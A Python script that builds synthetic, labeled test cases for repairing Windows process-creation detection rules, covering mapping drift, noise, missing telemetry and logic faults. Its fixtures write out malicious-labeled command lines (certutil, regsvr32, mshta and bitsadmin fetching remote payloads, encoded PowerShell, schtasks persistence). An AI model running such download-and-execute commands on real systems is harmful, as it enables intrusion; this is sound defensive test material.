"""Generate the bundled detection-repair demo cases (synthetic, labeled fixtures).

Run from the repo root: ``uv run python scripts/build_detect_cases.py``. Output goes to
``src/kestrix/detect/cases/<case_id>/``. Every event is synthetic (provenance
``synthetic``): these are unit-level demonstrations, not evidence about real telemetry.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import yaml

OUT = Path(__file__).resolve().parents[1] / "src" / "kestrix" / "detect" / "cases"

HEALTHY_MAPPING = {
    "Image": "process.executable",
    "CommandLine": "process.command_line",
    "ParentImage": "process.parent.executable",
    "ParentCommandLine": "process.parent.command_line",
    "User": "user.name",
    "OriginalFileName": "process.pe.original_file_name",
    "Company": "process.pe.company",
}

SYS32 = "C:\\Windows\\System32\\"


def event(
    eid: str,
    label: str,
    scenario: str | None,
    image: str,
    cmd: str | None,
    parent: str | None,
    parent_cmd: str | None = None,
    user: str = "LAB\\analyst",
    company: str = "Microsoft Corporation",
    drop: tuple[str, ...] = (),
    rename: dict[str, str] | None = None,
) -> dict[str, object]:
    """Build one ECS-style process-creation event. ``drop`` removes fields (missing telemetry);
    ``rename`` moves a dotted field to a new dotted name (schema drift)."""
    flat: dict[str, object] = {
        "process.executable": image,
        "process.command_line": cmd,
        "process.parent.executable": parent,
        "process.parent.command_line": parent_cmd,
        "user.name": user,
        "process.pe.original_file_name": image.rsplit("\\", 1)[-1].upper(),
        "process.pe.company": company,
        "event.code": "1",
    }
    for key in drop:
        flat.pop(key, None)
    for old, new in (rename or {}).items():
        flat[new] = flat.pop(old)
    data: dict[str, object] = {}
    for key, value in flat.items():
        if value is None:
            continue
        node = data
        *parents, leaf = key.split(".")
        for p in parents:
            node = node.setdefault(p, {})  # type: ignore[assignment]
        node[leaf] = value
    return {"event_id": eid, "label": label, "scenario_id": scenario, "data": data}


def rule(title: str, rid: str, detection: dict[str, object], level: str = "high") -> str:
    doc = {
        "title": title,
        "id": rid,
        "status": "test",
        "level": level,
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": detection,
    }
    return yaml.safe_dump(doc, sort_keys=False)


def mapping(name: str, fields: dict[str, str]) -> str:
    return yaml.safe_dump({"schema_version": 1, "name": name, "fields": fields}, sort_keys=False)


def write_case(
    case_id: str, manifest: dict[str, object], files: dict[str, str], dev: list[dict], val: list[dict]
) -> None:
    d = OUT / case_id
    d.mkdir(parents=True)
    manifest = {"case_id": case_id, "provenance": "synthetic", "split": "development", **manifest}
    (d / "case.yml").write_text(yaml.safe_dump(manifest, sort_keys=False))
    for name, text in files.items():
        (d / name).write_text(text)
    for name, rows in (("development.jsonl", dev), ("validation.jsonl", val)):
        (d / name).write_text("".join(json.dumps(r, sort_keys=True) + "\n" for r in rows))


# ---- shared benign background -------------------------------------------------------
def background(prefix: str, **kw: object) -> list[dict]:
    return [
        event(
            f"{prefix}-b1",
            "benign",
            None,
            SYS32 + "svchost.exe",
            "svchost.exe -k netsvcs",
            SYS32 + "services.exe",
            **kw,
        ),
        event(
            f"{prefix}-b2",
            "benign",
            None,
            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "firefox.exe",
            "C:\\Windows\\explorer.exe",
            **kw,
        ),
        event(f"{prefix}-b3", "benign", None, SYS32 + "cmd.exe", "cmd.exe /c dir", "C:\\Windows\\explorer.exe", **kw),
        event(
            f"{prefix}-b4",
            "benign",
            None,
            SYS32 + "notepad.exe",
            "notepad.exe report.txt",
            "C:\\Windows\\explorer.exe",
            **kw,
        ),
    ]


def certutil_events(prefix: str, n_variant: int, **kw: object) -> list[dict]:
    urls = ["http://203.0.113.7/a.exe", "http://198.51.100.9/p.ps1", "https://192.0.2.44/x.dll"]
    mal = [
        event(
            f"{prefix}-m{i}",
            "malicious",
            f"S-certutil-{'urlcache' if i % 2 else 'verifyctl'}",
            SYS32 + "certutil.exe",
            f"certutil.exe {'-urlcache -split -f' if i % 2 else '-verifyctl -f -split'} {urls[i % 3]} out.bin",
            SYS32 + "cmd.exe",
            **kw,
        )
        for i in range(1, n_variant + 1)
    ]
    benign = [
        event(
            f"{prefix}-c1",
            "benign",
            None,
            SYS32 + "certutil.exe",
            "certutil.exe -hashfile setup.iso SHA256",
            SYS32 + "cmd.exe",
            **kw,
        ),
        event(
            f"{prefix}-c2",
            "benign",
            None,
            SYS32 + "certutil.exe",
            "certutil.exe -dump cert.cer",
            "C:\\Windows\\explorer.exe",
            **kw,
        ),
    ]
    return mal + benign + background(prefix, **kw)


CERTUTIL_DETECTION = {
    "selection": {"Image|endswith": "\\certutil.exe", "CommandLine|contains": ["-urlcache", "-verifyctl"]},
    "condition": "selection",
}


def build() -> None:
    if OUT.exists():
        shutil.rmtree(OUT)
    OUT.mkdir(parents=True)
    healthy_map = mapping("lab-ecs", HEALTHY_MAPPING)

    # C00 healthy control: nothing is wrong; the workflow must leave it unchanged.
    write_case(
        "c00-healthy-control",
        {
            "title": "Healthy control: certutil download",
            "root_id": "R-certutil",
            "fault": {"kind": "none"},
            "expected": {"outcome": "unchanged"},
        },
        {
            "rule.yml": rule("Certutil remote download", "8c5e2d1a-0000-4000-8000-000000000000", CERTUTIL_DETECTION),
            "mapping.yml": healthy_map,
        },
        certutil_events("c00d", 3),
        certutil_events("c00v", 4),
    )

    # C01 mapping drift: telemetry moved to ECS process.command_line, mapping still points at
    # the old winlogbeat field.
    drift_map = mapping("lab-ecs-stale", {**HEALTHY_MAPPING, "CommandLine": "winlog.event_data.CommandLine"})
    write_case(
        "c01-mapping-drift-commandline",
        {
            "title": "Mapping drift: CommandLine renamed",
            "root_id": "R-certutil",
            "fault": {
                "kind": "mapping",
                "detail": "CommandLine mapped to winlog.event_data.CommandLine; data uses process.command_line",
            },
            "expected": {"outcome": "repaired", "family": "mapping", "patch_kind": "mapping"},
        },
        {
            "rule.yml": rule("Certutil remote download", "8c5e2d1a-0000-4000-8000-000000000001", CERTUTIL_DETECTION),
            "mapping.yml": drift_map,
            "healthy_mapping.yml": healthy_map,
        },
        certutil_events("c01d", 3),
        certutil_events("c01v", 4),
    )

    # C02 mapping drift with an unrelated name: ParentImage now under process.parent.path.
    office = {
        "selection_parent": {"ParentImage|endswith": ["\\winword.exe", "\\excel.exe"]},
        "selection_child": {"Image|endswith": ["\\cmd.exe", "\\powershell.exe", "\\wscript.exe"]},
        "condition": "selection_parent and selection_child",
    }

    def office_events(prefix: str, n: int) -> list[dict]:
        rn = {"process.parent.executable": "process.parent.path"}
        parents = [
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
        ]
        children = [SYS32 + "cmd.exe", SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe", SYS32 + "wscript.exe"]
        mal = [
            event(
                f"{prefix}-m{i}",
                "malicious",
                f"S-office-{i % 2}",
                children[i % 3],
                "payload",
                parents[i % 2],
                rename=rn,
            )
            for i in range(1, n + 1)
        ]
        ben = [
            event(
                f"{prefix}-o1",
                "benign",
                None,
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                "excel.exe book.xlsx",
                "C:\\Windows\\explorer.exe",
                rename=rn,
            )
        ]
        return mal + ben + background(prefix, rename=rn)

    write_case(
        "c02-mapping-drift-parentimage",
        {
            "title": "Mapping drift: ParentImage moved to process.parent.path",
            "root_id": "R-office-child",
            "fault": {"kind": "mapping", "detail": "parent path field renamed with no name similarity"},
            "expected": {"outcome": "repaired", "family": "mapping", "patch_kind": "mapping"},
        },
        {
            "rule.yml": rule("Office application spawns a shell", "8c5e2d1a-0000-4000-8000-000000000002", office),
            "mapping.yml": healthy_map,
            "healthy_mapping.yml": mapping(
                "lab-ecs-parent-path", {**HEALTHY_MAPPING, "ParentImage": "process.parent.path"}
            ),
        },
        office_events("c02d", 4),
        office_events("c02v", 5),
    )

    # C03 noise: execution from Temp matches a legitimate updater.
    temp_rule = {"selection": {"Image|contains": "\\AppData\\Local\\Temp\\"}, "condition": "selection"}
    temp_healthy = {
        "selection": {"Image|contains": "\\AppData\\Local\\Temp\\"},
        "filter_updater": {"ParentImage": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe"},
        "condition": "selection and not filter_updater",
    }

    def temp_events(prefix: str, n_mal: int, n_upd: int) -> list[dict]:
        tmp = "C:\\Users\\alex\\AppData\\Local\\Temp\\"
        parents = [
            "C:\\Windows\\explorer.exe",
            SYS32 + "cmd.exe",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        ]
        mal = [
            event(f"{prefix}-m{i}", "malicious", f"S-temp-{i % 3}", f"{tmp}inv_{i}.exe", f"inv_{i}.exe", parents[i % 3])
            for i in range(1, n_mal + 1)
        ]
        upd = [
            event(
                f"{prefix}-u{i}",
                "benign",
                None,
                f"{tmp}GUM{i:04d}.tmp\\GoogleUpdateSetup.exe",
                "GoogleUpdateSetup.exe /silent",
                "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
                company="Google LLC",
            )
            for i in range(1, n_upd + 1)
        ]
        return mal + upd + background(prefix)

    write_case(
        "c03-noise-updater-temp",
        {
            "title": "Noise: updater executes from Temp",
            "root_id": "R-temp-exec",
            "fault": {"kind": "noise", "detail": "legitimate updater matched; needs a narrow parent exclusion"},
            "expected": {"outcome": "repaired", "family": "noise", "patch_kind": "rule"},
        },
        {
            "rule.yml": rule(
                "Execution from user Temp directory", "8c5e2d1a-0000-4000-8000-000000000003", temp_rule, "medium"
            ),
            "healthy_rule.yml": rule(
                "Execution from user Temp directory", "8c5e2d1a-0000-4000-8000-000000000003", temp_healthy, "medium"
            ),
            "mapping.yml": healthy_map,
        },
        temp_events("c03d", 3, 4),
        temp_events("c03v", 4, 5),
    )

    # C04 noise: scheduled task creation by an installer.
    sch = {
        "selection": {"Image|endswith": "\\schtasks.exe", "CommandLine|contains": "/create"},
        "condition": "selection",
    }
    sch_healthy = {
        **sch,
        "filter_installer": {"ParentImage": SYS32 + "msiexec.exe"},
        "condition": "selection and not filter_installer",
    }

    def sch_events(prefix: str, n: int) -> list[dict]:
        parents = [SYS32 + "cmd.exe", SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe", SYS32 + "wscript.exe"]
        mal = [
            event(
                f"{prefix}-m{i}",
                "malicious",
                f"S-schtasks-{i % 3}",
                SYS32 + "schtasks.exe",
                f"schtasks.exe /create /sc minute /tn upd{i} /tr C:\\Users\\Public\\u{i}.exe",
                parents[i % 3],
            )
            for i in range(1, n + 1)
        ]
        ben = [
            event(
                f"{prefix}-i{i}",
                "benign",
                None,
                SYS32 + "schtasks.exe",
                f'schtasks.exe /create /tn "Adobe Acrobat Update Task {i}" /xml task.xml',
                SYS32 + "msiexec.exe",
                user="NT AUTHORITY\\SYSTEM",
            )
            for i in range(1, 4)
        ]
        return mal + ben + background(prefix)

    write_case(
        "c04-noise-installer-schtasks",
        {
            "title": "Noise: installer creates scheduled tasks",
            "root_id": "R-schtasks",
            "fault": {"kind": "noise"},
            "expected": {"outcome": "repaired", "family": "noise", "patch_kind": "rule"},
        },
        {
            "rule.yml": rule("Scheduled task created", "8c5e2d1a-0000-4000-8000-000000000004", sch, "medium"),
            "healthy_rule.yml": rule(
                "Scheduled task created", "8c5e2d1a-0000-4000-8000-000000000004", sch_healthy, "medium"
            ),
            "mapping.yml": healthy_map,
        },
        sch_events("c04d", 3),
        sch_events("c04v", 4),
    )

    # C05 missing telemetry: command lines are not collected at all.
    enc = {
        "selection": {"Image|endswith": "\\powershell.exe", "CommandLine|contains": [" -enc ", " -EncodedCommand "]},
        "condition": "selection",
    }

    def enc_events(prefix: str) -> list[dict]:
        ps = SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe"
        drop = ("process.command_line", "process.parent.command_line")
        rows = [
            event(
                f"{prefix}-m{i}",
                "malicious",
                "S-encoded-ps",
                ps,
                f"powershell.exe -enc SQBFAFgA{i}",
                SYS32 + "cmd.exe",
                drop=drop,
            )
            for i in range(1, 4)
        ]
        rows += [
            event(
                f"{prefix}-p1", "benign", None, ps, "powershell.exe -File backup.ps1", SYS32 + "svchost.exe", drop=drop
            )
        ]
        return rows + background(prefix, drop=drop)

    write_case(
        "c05-missing-telemetry-commandline",
        {
            "title": "Missing telemetry: command line not collected",
            "root_id": "R-encoded-ps",
            "fault": {"kind": "missing_telemetry", "field": "CommandLine"},
            "expected": {"outcome": "insufficient_evidence", "family": "missing_telemetry"},
        },
        {
            "rule.yml": rule("Encoded PowerShell command", "8c5e2d1a-0000-4000-8000-000000000005", enc),
            "mapping.yml": healthy_map,
        },
        enc_events("c05d"),
        enc_events("c05v"),
    )

    # C06 missing telemetry: parent process fields absent.
    wmi = {
        "selection": {"ParentImage|endswith": "\\WmiPrvSE.exe", "Image|endswith": "\\powershell.exe"},
        "condition": "selection",
    }

    def wmi_events(prefix: str) -> list[dict]:
        drop = ("process.parent.executable", "process.parent.command_line")
        ps = SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe"
        rows = [
            event(
                f"{prefix}-m{i}",
                "malicious",
                "S-wmi-ps",
                ps,
                f"powershell.exe -nop -w hidden {i}",
                SYS32 + "wbem\\WmiPrvSE.exe",
                drop=drop,
            )
            for i in range(1, 4)
        ]
        return rows + background(prefix, drop=drop)

    write_case(
        "c06-missing-telemetry-parentimage",
        {
            "title": "Missing telemetry: parent process not collected",
            "root_id": "R-wmi-child",
            "fault": {"kind": "missing_telemetry", "field": "ParentImage"},
            "expected": {"outcome": "insufficient_evidence", "family": "missing_telemetry"},
        },
        {
            "rule.yml": rule("WMI spawns PowerShell", "8c5e2d1a-0000-4000-8000-000000000006", wmi),
            "mapping.yml": healthy_map,
        },
        wmi_events("c06d"),
        wmi_events("c06v"),
    )

    # C07 logic fault: 'and' where 'or' was intended between two LOLBin selections.
    lol_bad = {
        "sel_rundll": {"Image|endswith": "\\rundll32.exe", "CommandLine|contains": "javascript:"},
        "sel_regsvr": {"Image|endswith": "\\regsvr32.exe", "CommandLine|contains": "/i:http"},
        "condition": "sel_rundll and sel_regsvr",
    }

    def lol_events(prefix: str, n: int) -> list[dict]:
        rows = []
        for i in range(1, n + 1):
            if i % 2:
                rows.append(
                    event(
                        f"{prefix}-m{i}",
                        "malicious",
                        "S-rundll-js",
                        SYS32 + "rundll32.exe",
                        f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";x{i}',
                        SYS32 + "cmd.exe",
                    )
                )
            else:
                rows.append(
                    event(
                        f"{prefix}-m{i}",
                        "malicious",
                        "S-squiblydoo",
                        SYS32 + "regsvr32.exe",
                        f"regsvr32.exe /s /n /u /i:http://203.0.113.{i}/f.sct scrobj.dll",
                        SYS32 + "cmd.exe",
                    )
                )
        rows += [
            event(
                f"{prefix}-r1",
                "benign",
                None,
                SYS32 + "rundll32.exe",
                "rundll32.exe shell32.dll,Control_RunDLL",
                "C:\\Windows\\explorer.exe",
            ),
            event(
                f"{prefix}-r2",
                "benign",
                None,
                SYS32 + "regsvr32.exe",
                "regsvr32.exe /s vendor.dll",
                SYS32 + "msiexec.exe",
            ),
        ]
        return rows + background(prefix)

    write_case(
        "c07-logic-and-or",
        {
            "title": "Logic fault: and instead of or",
            "root_id": "R-lolbin",
            "fault": {"kind": "logic", "detail": "condition requires both selections, which can never co-occur"},
            "expected": {"outcome": "repaired", "family": "logic", "patch_kind": "rule"},
        },
        {
            "rule.yml": rule(
                "Script execution via rundll32 or regsvr32", "8c5e2d1a-0000-4000-8000-000000000007", lol_bad
            ),
            "mapping.yml": healthy_map,
        },
        lol_events("c07d", 4),
        lol_events("c07v", 6),
    )

    # C08 modifier fault: exact match on a bare file name instead of endswith.
    mshta_bad = {"selection": {"Image": "mshta.exe", "CommandLine|contains": "http"}, "condition": "selection"}

    def mshta_events(prefix: str, n: int) -> list[dict]:
        rows = [
            event(
                f"{prefix}-m{i}",
                "malicious",
                f"S-mshta-{i % 2}",
                SYS32 + "mshta.exe",
                f"mshta.exe http://198.51.100.{i}/run.hta",
                SYS32 + "cmd.exe",
            )
            for i in range(1, n + 1)
        ]
        rows += [
            event(
                f"{prefix}-h1",
                "benign",
                None,
                SYS32 + "mshta.exe",
                "mshta.exe C:\\Tools\\local.hta",
                "C:\\Windows\\explorer.exe",
            )
        ]
        return rows + background(prefix)

    write_case(
        "c08-modifier-exact-vs-endswith",
        {
            "title": "Value fault: exact file name instead of path suffix",
            "root_id": "R-mshta",
            "fault": {"kind": "logic", "detail": "Image compared exactly to 'mshta.exe' but holds a full path"},
            "expected": {"outcome": "repaired", "family": "logic", "patch_kind": "rule"},
        },
        {
            "rule.yml": rule("Remote HTA via mshta", "8c5e2d1a-0000-4000-8000-000000000008", mshta_bad),
            "mapping.yml": healthy_map,
        },
        mshta_events("c08d", 3),
        mshta_events("c08v", 4),
    )

    # C09 unsupported semantics: regex modifier is outside the v1 subset.
    regex_rule = {
        "selection": {"CommandLine|re": "(?i)-e(nc|ncodedcommand)\\s+[A-Za-z0-9+/=]{40,}"},
        "condition": "selection",
    }
    write_case(
        "c09-unsupported-regex",
        {
            "title": "Unsupported: regex modifier",
            "root_id": "R-encoded-ps-re",
            "fault": {"kind": "unsupported"},
            "expected": {"outcome": "unsupported"},
        },
        {
            "rule.yml": rule("Encoded PowerShell (regex)", "8c5e2d1a-0000-4000-8000-000000000009", regex_rule),
            "mapping.yml": healthy_map,
        },
        enc_events("c09d"),
        enc_events("c09v"),
    )

    # C10 logic fault: filter applied without 'not', so only the benign SCCM path matches.
    bits_bad = {
        "selection": {"Image|endswith": "\\bitsadmin.exe", "CommandLine|contains": "/transfer"},
        "filter_sccm": {"ParentImage|endswith": "\\CCM\\CcmExec.exe"},
        "condition": "selection and filter_sccm",
    }

    def bits_events(prefix: str, n: int) -> list[dict]:
        parents = [SYS32 + "cmd.exe", SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe"]
        rows = [
            event(
                f"{prefix}-m{i}",
                "malicious",
                f"S-bits-{i % 2}",
                SYS32 + "bitsadmin.exe",
                f"bitsadmin.exe /transfer j{i} http://203.0.113.{i}/b.exe C:\\Users\\Public\\b{i}.exe",
                parents[i % 2],
            )
            for i in range(1, n + 1)
        ]
        rows += [
            event(
                f"{prefix}-s{i}",
                "benign",
                None,
                SYS32 + "bitsadmin.exe",
                f"bitsadmin.exe /transfer ccm{i} http://sccm.lab/pkg{i}.cab C:\\Windows\\ccmcache\\p{i}.cab",
                "C:\\Windows\\CCM\\CcmExec.exe",
                user="NT AUTHORITY\\SYSTEM",
            )
            for i in range(1, 3)
        ]
        return rows + background(prefix)

    write_case(
        "c10-logic-missing-not",
        {
            "title": "Logic fault: exclusion filter missing 'not'",
            "root_id": "R-bitsadmin",
            "fault": {"kind": "logic", "detail": "condition is 'selection and filter_sccm'"},
            "expected": {"outcome": "repaired", "family": "logic", "patch_kind": "rule"},
        },
        {
            "rule.yml": rule("BITS download job", "8c5e2d1a-0000-4000-8000-000000000010", bits_bad),
            "mapping.yml": healthy_map,
        },
        bits_events("c10d", 3),
        bits_events("c10v", 4),
    )


if __name__ == "__main__":
    build()
    print(f"wrote {len(list(OUT.iterdir()))} cases to {OUT}")
